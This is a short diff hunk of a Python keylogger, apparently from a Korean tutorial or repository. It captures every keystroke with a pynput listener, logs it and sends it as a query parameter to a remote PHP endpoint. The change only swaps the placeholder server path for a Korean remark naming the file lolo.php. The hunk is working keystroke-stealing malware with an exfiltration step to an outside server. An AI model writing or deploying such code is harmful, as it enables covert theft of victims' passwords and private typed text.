@@ -14,6 +14,6 @@ def on_press(key):
     logging.info(str(key))
     per=str(key)
     payload = {'k':per}
-    r = requests.get('서버/php파일.php', params=payload)
+    r = requests.get('서버/php파일 여기서는 임의의 이름으로 lolo.php 라 하겠음', params=payload)
 with Listener(on_press=on_press) as listener:
     listener.join()
